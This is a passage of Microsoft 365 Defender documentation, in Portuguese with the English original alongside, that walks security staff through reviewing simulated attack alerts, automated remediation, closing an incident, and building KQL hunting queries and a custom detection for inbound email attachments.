<span data-ttu-id="732ab-217">**Alerta: reconhecimento de endereço IP e de usuário (SMB) (origem: Microsoft defender para identidade)**</span><span class="sxs-lookup"><span data-stu-id="732ab-217">**Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)**</span></span>

<span data-ttu-id="732ab-218">A enumeração usando protocolo SMB permite que os invasores obtenham informações recentes de logon do usuário que os ajuda a se moverem mais tarde através da rede para acessar uma conta específica.</span><span class="sxs-lookup"><span data-stu-id="732ab-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="732ab-219">Nessa detecção, um alerta é disparado quando a enumeração de sessão SMB é executada em um controlador de domínio.</span><span class="sxs-lookup"><span data-stu-id="732ab-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Captura de tela do alerta do Microsoft defender for Identity para reconhecimento de endereço IP e de usuário](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="732ab-221">Examinar a linha do tempo do dispositivo [Microsoft defender para ponto de extremidade]</span><span class="sxs-lookup"><span data-stu-id="732ab-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>
<span data-ttu-id="732ab-222">Após explorar os vários alertas neste incidente, navegue de volta para a página de incidente que você investigou anteriormente.</span><span class="sxs-lookup"><span data-stu-id="732ab-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="732ab-223">Selecione a guia **dispositivos** na página incidente para examinar os dispositivos envolvidos neste incidente como relatado pelo Microsoft defender for Endpoint e pelo Microsoft defender para identidade.</span><span class="sxs-lookup"><span data-stu-id="732ab-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="732ab-224">Selecione o nome do dispositivo em que o ataque foi conduzido, para abrir a página de entidade desse dispositivo específico.</span><span class="sxs-lookup"><span data-stu-id="732ab-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="732ab-225">Nessa página, você pode ver alertas que foram disparados e eventos relacionados.</span><span class="sxs-lookup"><span data-stu-id="732ab-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="732ab-226">Selecione a guia **linha do tempo** para abrir a linha do tempo do dispositivo e exibir todos os eventos e comportamentos observados no dispositivo em ordem cronológica, intercalado com os alertas gerados.</span><span class="sxs-lookup"><span data-stu-id="732ab-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Captura de tela da linha do tempo do dispositivo com comportamentos](../../media/mtp/fig11.png) 

<span data-ttu-id="732ab-228">A expansão de alguns dos comportamentos mais interessantes fornece detalhes úteis, como árvores de processo.</span><span class="sxs-lookup"><span data-stu-id="732ab-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="732ab-229">Por exemplo, role para baixo até encontrar o evento de alerta **injeções de processo suspeito observado**.</span><span class="sxs-lookup"><span data-stu-id="732ab-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="732ab-230">Selecione o **powershell.exe injetado para notepad.exe evento Process** abaixo dele, para exibir a árvore de processos completo para esse comportamento no gráfico de **entidades de evento** no painel lateral.</span><span class="sxs-lookup"><span data-stu-id="732ab-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="732ab-231">Use a barra de pesquisa para filtragem, se necessário.</span><span class="sxs-lookup"><span data-stu-id="732ab-231">Use the search bar for filtering if necessary.</span></span>

![Captura de tela da árvore de processos para o comportamento de criação de arquivo do PowerShell selecionado](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="732ab-233">Analisar as informações do usuário [Microsoft Cloud app Security]</span><span class="sxs-lookup"><span data-stu-id="732ab-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="732ab-234">Na página incidente, selecione a guia **usuários** para exibir a lista de usuários envolvidos no ataque.</span><span class="sxs-lookup"><span data-stu-id="732ab-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="732ab-235">A tabela contém informações adicionais sobre cada usuário, incluindo a pontuação de **prioridade de investigação** de cada usuário.</span><span class="sxs-lookup"><span data-stu-id="732ab-235">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="732ab-236">Selecione o nome do usuário para abrir a página de perfil do usuário, onde a investigação adicional pode ser conduzida.</span><span class="sxs-lookup"><span data-stu-id="732ab-236">Select the user name to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="732ab-237">[Leia mais sobre a investigação de usuários arriscados](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span><span class="sxs-lookup"><span data-stu-id="732ab-237">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="732ab-238">![Captura de tela da página do usuário do Cloud app Security](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="732ab-238">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="732ab-239">Investigação e correção automatizadas</span><span class="sxs-lookup"><span data-stu-id="732ab-239">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="732ab-240">Antes de orientá-lo nesta simulação, Assista ao vídeo a seguir para se familiarizar com o que é a AutoCorreção automatizada, onde encontrá-lo no portal e como ele pode ajudar em suas operações de segurança:</span><span class="sxs-lookup"><span data-stu-id="732ab-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="732ab-241">Navegue de volta para o incidente no portal da central de segurança do Microsoft 365.</span><span class="sxs-lookup"><span data-stu-id="732ab-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="732ab-242">A guia **investigações** na página **incidente** mostra as investigações automatizadas que foram acionadas pelo Microsoft defender for Identity e pelo Microsoft defender para ponto de extremidade.</span><span class="sxs-lookup"><span data-stu-id="732ab-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="732ab-243">A captura de tela abaixo exibe apenas a investigação automatizada disparada pelo defender para ponto de extremidade.</span><span class="sxs-lookup"><span data-stu-id="732ab-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="732ab-244">Por padrão, o defender para ponto de extremidade corrige automaticamente os artefatos encontrados na fila, o que exige correção.</span><span class="sxs-lookup"><span data-stu-id="732ab-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Captura de tela de investigações automatizadas relacionadas ao incidente](../../media/mtp/fig14.png)

<span data-ttu-id="732ab-246">Selecione o alerta que disparou uma investigação para abrir a página **detalhes da investigação** .</span><span class="sxs-lookup"><span data-stu-id="732ab-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="732ab-247">Você verá os seguintes detalhes:</span><span class="sxs-lookup"><span data-stu-id="732ab-247">You’ll see the following details:</span></span>
- <span data-ttu-id="732ab-248">Alerta (s) que disparou a investigação automatizada.</span><span class="sxs-lookup"><span data-stu-id="732ab-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="732ab-249">Usuários e dispositivos afetados.</span><span class="sxs-lookup"><span data-stu-id="732ab-249">Impacted users and devices.</span></span> <span data-ttu-id="732ab-250">Se forem encontrados indicadores em dispositivos adicionais, esses dispositivos adicionais também serão listados.</span><span class="sxs-lookup"><span data-stu-id="732ab-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="732ab-251">Lista de evidências.</span><span class="sxs-lookup"><span data-stu-id="732ab-251">List of evidence.</span></span> <span data-ttu-id="732ab-252">As entidades encontradas e analisadas, como arquivos, processos, serviços, drivers e endereços de rede.</span><span class="sxs-lookup"><span data-stu-id="732ab-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="732ab-253">Essas entidades são analisadas para possíveis relações com o alerta e classificadas como benignas ou mal-intencionadas.</span><span class="sxs-lookup"><span data-stu-id="732ab-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="732ab-254">Ameaças encontradas.</span><span class="sxs-lookup"><span data-stu-id="732ab-254">Threats found.</span></span> <span data-ttu-id="732ab-255">Ameaças conhecidas encontradas durante a investigação.</span><span class="sxs-lookup"><span data-stu-id="732ab-255">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="732ab-256">Dependendo do tempo, a investigação automatizada ainda pode estar em execução.</span><span class="sxs-lookup"><span data-stu-id="732ab-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="732ab-257">Aguarde alguns minutos para que o processo seja concluído antes de coletar e analisar as evidências e revisar os resultados.</span><span class="sxs-lookup"><span data-stu-id="732ab-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="732ab-258">Atualize a página **detalhes da investigação** para obter as últimas descobertas.</span><span class="sxs-lookup"><span data-stu-id="732ab-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Captura de tela da página de detalhes de investigação](../../media/mtp/fig15.png)

<span data-ttu-id="732ab-260">Durante a investigação automatizada, o Microsoft defender para ponto de extremidade identificou o processo de notepad.exe, que foi injetado como um dos artefatos que exigem correção.</span><span class="sxs-lookup"><span data-stu-id="732ab-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="732ab-261">O defender for Endpoint interrompe automaticamente a injeção de processo suspeita como parte da correção automatizada.</span><span class="sxs-lookup"><span data-stu-id="732ab-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="732ab-262">Você pode ver <i>notepad.exe</i> desaparecer da lista de processos em execução no dispositivo de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="732ab-263">Resolver o incidente</span><span class="sxs-lookup"><span data-stu-id="732ab-263">Resolve the incident</span></span>

<span data-ttu-id="732ab-264">Após a investigação ser concluída e confirmada para ser corrigida, feche o incidente.</span><span class="sxs-lookup"><span data-stu-id="732ab-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="732ab-265">Selecione **gerenciar incidente**.</span><span class="sxs-lookup"><span data-stu-id="732ab-265">Select **Manage incident**.</span></span> <span data-ttu-id="732ab-266">Defina o status como **resolver incidente** e selecione a classificação relevante.</span><span class="sxs-lookup"><span data-stu-id="732ab-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="732ab-267">Quando o incidente é resolvido, ele fecha todos os alertas associados no centro de segurança do Microsoft 365 e nos portais relacionados.</span><span class="sxs-lookup"><span data-stu-id="732ab-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Captura de tela da página incidentes com o painel abrir gerenciamento de incidentes onde você pode clicar na opção para resolver o incidente](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="732ab-269">Isso envolve a simulação de ataque para o gerenciamento de incidentes e os cenários de investigação e correção automatizados.</span><span class="sxs-lookup"><span data-stu-id="732ab-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="732ab-270">A próxima simulação o levará através da busca proativa de arquivos possivelmente mal-intencionados.</span><span class="sxs-lookup"><span data-stu-id="732ab-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="732ab-271">Cenário de busca avançada</span><span class="sxs-lookup"><span data-stu-id="732ab-271">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="732ab-272">Antes de orientá-lo pela simulação, Assista ao vídeo a seguir para entender os conceitos avançados de busca, confira onde você pode encontrá-lo no portal e saiba como ele pode ajudá-lo em suas operações de segurança:</span><span class="sxs-lookup"><span data-stu-id="732ab-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="732ab-273">Requisitos de ambiente de caça</span><span class="sxs-lookup"><span data-stu-id="732ab-273">Hunting environment requirements</span></span>
<span data-ttu-id="732ab-274">Há uma única caixa de correio e dispositivo internos necessários para este cenário.</span><span class="sxs-lookup"><span data-stu-id="732ab-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="732ab-275">Você também precisará de uma conta de email externa para enviar a mensagem de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-275">You'll also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="732ab-276">Verifique se o seu locatário [ativou o Microsoft 365 defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="732ab-276">Verify that your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="732ab-277">Identificar uma caixa de correio de destino a ser usada para receber emails.</span><span class="sxs-lookup"><span data-stu-id="732ab-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="732ab-278">a.</span><span class="sxs-lookup"><span data-stu-id="732ab-278">a.</span></span>  <span data-ttu-id="732ab-279">Esta caixa de correio deve ser monitorada pelo Microsoft defender para Office 365 b.</span><span class="sxs-lookup"><span data-stu-id="732ab-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span>  <span data-ttu-id="732ab-280">O dispositivo do requisito 3 precisa acessar esta caixa de correio</span><span class="sxs-lookup"><span data-stu-id="732ab-280">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="732ab-281">Configurar um dispositivo de teste: a.</span><span class="sxs-lookup"><span data-stu-id="732ab-281">Configure a test device: a.</span></span>  <span data-ttu-id="732ab-282">Verifique se você está usando a versão 1903 ou posterior do Windows 10.</span><span class="sxs-lookup"><span data-stu-id="732ab-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="732ab-283">b.</span><span class="sxs-lookup"><span data-stu-id="732ab-283">b.</span></span>  <span data-ttu-id="732ab-284">Ingresse o dispositivo de teste no domínio de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="732ab-285">c.</span><span class="sxs-lookup"><span data-stu-id="732ab-285">c.</span></span>  <span data-ttu-id="732ab-286">[Ative o Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="732ab-286">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="732ab-287">Se você estiver tendo problemas para habilitar o Windows Defender Antivirus, consulte [Este tópico de solução de problemas](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="732ab-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="732ab-288">d.</span><span class="sxs-lookup"><span data-stu-id="732ab-288">d.</span></span>  <span data-ttu-id="732ab-289">[Integração com o Microsoft defender para ponto de extremidade](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="732ab-289">[Onboard to Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="732ab-290">Executar a simulação</span><span class="sxs-lookup"><span data-stu-id="732ab-290">Run the simulation</span></span>
1.  <span data-ttu-id="732ab-291">A partir de uma conta de email externa, envie um email para a caixa de correio identificada na etapa 2 da seção requisitos do ambiente de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="732ab-292">Incluir um anexo que será permitido por meio de qualquer política de filtro de email existente.</span><span class="sxs-lookup"><span data-stu-id="732ab-292">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="732ab-293">Este arquivo não precisa ser mal-intencionado ou executável.</span><span class="sxs-lookup"><span data-stu-id="732ab-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="732ab-294">Os tipos de arquivo sugeridos são <i>. pdf</i>, <i>. exe</i> (se permitido) ou documento do Office, como um arquivo do Word.</span><span class="sxs-lookup"><span data-stu-id="732ab-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="732ab-295">Abra o email enviado do dispositivo configurado conforme definido na etapa 3 da seção requisitos do ambiente de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="732ab-296">Abra o anexo ou salve o arquivo no dispositivo.</span><span class="sxs-lookup"><span data-stu-id="732ab-296">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="732ab-297">**Caça**</span><span class="sxs-lookup"><span data-stu-id="732ab-297">**Go hunting**</span></span>
1.  <span data-ttu-id="732ab-298">Abra o portal do security.microsoft.com.</span><span class="sxs-lookup"><span data-stu-id="732ab-298">Open the security.microsoft.com portal.</span></span>

2.  <span data-ttu-id="732ab-299">Navegue até **caça > busca avançada**.</span><span class="sxs-lookup"><span data-stu-id="732ab-299">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![Captura de tela de busca avançada na barra de navegação do portal central de segurança do M365](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="732ab-301">Criar uma consulta que comece coletando eventos de email.</span><span class="sxs-lookup"><span data-stu-id="732ab-301">Build a query that starts by gathering email events.</span></span>

    1.  <span data-ttu-id="732ab-302">No painel de consulta, selecione novo.</span><span class="sxs-lookup"><span data-stu-id="732ab-302">From the query pane, select New.</span></span>
    
    1.  <span data-ttu-id="732ab-303">Clique duas vezes na tabela EmailEvents do esquema.</span><span class="sxs-lookup"><span data-stu-id="732ab-303">Double-click on the EmailEvents table from the schema.</span></span>

        ```
        EmailEvents 
        ```                                        

    1.  <span data-ttu-id="732ab-304">Alterar o intervalo de tempo para as últimas 24 horas.</span><span class="sxs-lookup"><span data-stu-id="732ab-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="732ab-305">Supondo que o email enviado quando você executou a simulação acima estava nas últimas 24 horas, caso contrário, altere o intervalo de tempo.</span><span class="sxs-lookup"><span data-stu-id="732ab-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
    
        ![Captura de tela de onde você pode alterar o intervalo de tempo.](../../media/mtp/fig18.png) 

    1.  <span data-ttu-id="732ab-308">Execute a consulta.</span><span class="sxs-lookup"><span data-stu-id="732ab-308">Run the query.</span></span>  <span data-ttu-id="732ab-309">Você pode ter muitos resultados, dependendo do ambiente do piloto.</span><span class="sxs-lookup"><span data-stu-id="732ab-309">You may have many results depending on the environment for the pilot.</span></span>  

        > [!NOTE]
        > <span data-ttu-id="732ab-310">Consulte a próxima etapa para filtrar opções para limitar o retorno de dados.</span><span class="sxs-lookup"><span data-stu-id="732ab-310">See the next step for filtering options to limit data return.</span></span>

        ![Captura de tela dos resultados da consulta de busca avançada](../../media/mtp/fig19.png) 

        > [!NOTE]
        > <span data-ttu-id="732ab-312">A busca avançada exibe resultados de consulta como dados tabulares.</span><span class="sxs-lookup"><span data-stu-id="732ab-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="732ab-313">Você também pode optar por exibir os dados em outros tipos de formato, como gráficos.</span><span class="sxs-lookup"><span data-stu-id="732ab-313">You can also opt to view the data in other format types such as charts.</span></span>    

    1.  <span data-ttu-id="732ab-314">Examine os resultados e veja se é possível identificar o email que você abriu.</span><span class="sxs-lookup"><span data-stu-id="732ab-314">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="732ab-315">Pode levar até 2 horas para que a mensagem apareça na busca avançada.</span><span class="sxs-lookup"><span data-stu-id="732ab-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="732ab-316">Se o ambiente de email for grande e houver muitos resultados, talvez você queira usar a **opção Mostrar filtros** para localizar a mensagem.</span><span class="sxs-lookup"><span data-stu-id="732ab-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

           <span data-ttu-id="732ab-317">No exemplo, o email foi enviado de uma conta do Yahoo.</span><span class="sxs-lookup"><span data-stu-id="732ab-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="732ab-318">Clique no **+** ícone ao lado de **yahoo.com** sob a seção SenderFromDomain e, em seguida, clique em **aplicar** para adicionar o domínio selecionado à consulta.</span><span class="sxs-lookup"><span data-stu-id="732ab-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="732ab-319">Use a conta de domínio ou de email que foi usada para enviar a mensagem de teste na etapa 1 da execução da simulação para filtrar os resultados.</span><span class="sxs-lookup"><span data-stu-id="732ab-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="732ab-320">Execute novamente a consulta para obter um conjunto de resultados menor para verificar se você vê a mensagem da simulação.</span><span class="sxs-lookup"><span data-stu-id="732ab-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
        ![Captura de tela dos filtros.](../../media/mtp/fig20.png) 

        ```console
        EmailEvents 
        | where SenderMailFromDomain == "yahoo.com"
        ```

    1.  <span data-ttu-id="732ab-323">Clique nas linhas resultantes da consulta para que você possa inspecionar o registro.</span><span class="sxs-lookup"><span data-stu-id="732ab-323">Click the resulting rows from the query so you can inspect the record.</span></span>
   
        ![Captura de tela do painel do lado inspecionar registro que abre quando um resultado de busca avançada é selecionado](../../media/mtp/fig21.png) 

4.  <span data-ttu-id="732ab-325">Agora que você verificou que pode ver o email, adicione um filtro para os anexos.</span><span class="sxs-lookup"><span data-stu-id="732ab-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="732ab-326">Concentre-se em todos os emails com anexos no ambiente.</span><span class="sxs-lookup"><span data-stu-id="732ab-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="732ab-327">Para esse cenário, concentre-se em emails de entrada, não aqueles que estão sendo enviados de seu ambiente.</span><span class="sxs-lookup"><span data-stu-id="732ab-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="732ab-328">Remova qualquer filtro adicionado para localizar sua mensagem e adicionar "| onde **AttachmentCount > 0** e **EmailDirection**  ==  **"entrada"** "</span><span class="sxs-lookup"><span data-stu-id="732ab-328">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

    <span data-ttu-id="732ab-329">A consulta a seguir mostrará o resultado com uma lista mais curta do que a consulta inicial de todos os eventos de email:</span><span class="sxs-lookup"><span data-stu-id="732ab-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"

    ```

5.  <span data-ttu-id="732ab-330">Em seguida, inclua as informações sobre o anexo (como: nome de arquivo, hashes) para o conjunto de resultados.</span><span class="sxs-lookup"><span data-stu-id="732ab-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="732ab-331">Para fazer isso, ingresse na tabela **EmailAttachmentInfo** .</span><span class="sxs-lookup"><span data-stu-id="732ab-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="732ab-332">Os campos comuns a serem usados para ingressar, neste caso, são **NetworkMessageId** e **RecipientObjectId**.</span><span class="sxs-lookup"><span data-stu-id="732ab-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

    <span data-ttu-id="732ab-333">A consulta a seguir também inclui uma linha adicional "| **Project-Rename EmailTimestamp = timestamp ",** que ajudará a identificar qual carimbo de data/hora estava relacionado ao email versus carimbos de data/hora relacionados às ações de arquivo que você adicionará na próxima etapa.</span><span class="sxs-lookup"><span data-stu-id="732ab-333">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    ```

6.  <span data-ttu-id="732ab-334">Em seguida, use o valor **SHA256** da tabela **EmailAttachmentInfo** para localizar **DeviceFileEvents** (ações de arquivo que ocorreram no ponto de extremidade) desse hash.</span><span class="sxs-lookup"><span data-stu-id="732ab-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="732ab-335">O campo comum aqui será o hash SHA256 para o anexo.</span><span class="sxs-lookup"><span data-stu-id="732ab-335">The common field here will be the SHA256 hash for the attachment.</span></span>

    <span data-ttu-id="732ab-336">A tabela resultante agora inclui detalhes do ponto de extremidade (Microsoft defender para ponto de extremidade), como o nome do dispositivo, qual ação foi realizada (neste caso, filtrados para incluir apenas eventos filecreated) e onde o arquivo foi armazenado.</span><span class="sxs-lookup"><span data-stu-id="732ab-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="732ab-337">O nome da conta associado ao processo também será incluído.</span><span class="sxs-lookup"><span data-stu-id="732ab-337">The account name associated with the process will also be included.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    ```

<span data-ttu-id="732ab-338">Você criou uma consulta que identificará todos os emails de entrada onde o usuário abriu ou salvou o anexo.</span><span class="sxs-lookup"><span data-stu-id="732ab-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="732ab-339">Você também pode refinar essa consulta para filtrar domínios de remetente específicos, tamanhos de arquivos, tipos de arquivo e assim por diante.</span><span class="sxs-lookup"><span data-stu-id="732ab-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="732ab-340">As funções são um tipo especial de União, que permite extrair mais dados de TI sobre um arquivo como suas predominância, as informações de signatário e emissor, etc.  Para obter mais detalhes sobre o arquivo, use a função **fileprofile ()** enriquecimento:</span><span class="sxs-lookup"><span data-stu-id="732ab-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```


<span data-ttu-id="732ab-341">**Criar uma detecção**</span><span class="sxs-lookup"><span data-stu-id="732ab-341">**Create a detection**</span></span>

<span data-ttu-id="732ab-342">Depois de criar uma consulta que identifique informações que você gostaria de **receber alertas** sobre se elas ocorrerem no futuro, você pode criar uma detecção personalizada da consulta.</span><span class="sxs-lookup"><span data-stu-id="732ab-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="732ab-343">As detecções personalizadas executarão a consulta de acordo com a frequência que você definir, e os resultados das consultas criarão alertas de segurança, com base nos ativos afetados que você escolher.</span><span class="sxs-lookup"><span data-stu-id="732ab-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="732ab-344">Esses alertas serão correlacionados a incidentes e podem ser classificados como qualquer outro alerta de segurança gerado por um dos produtos.</span><span class="sxs-lookup"><span data-stu-id="732ab-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="732ab-345">Na página consulta, remova as linhas 7 e 8 que foram adicionadas na etapa 7 das instruções go caça e clique em **criar regra de detecção**.</span><span class="sxs-lookup"><span data-stu-id="732ab-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
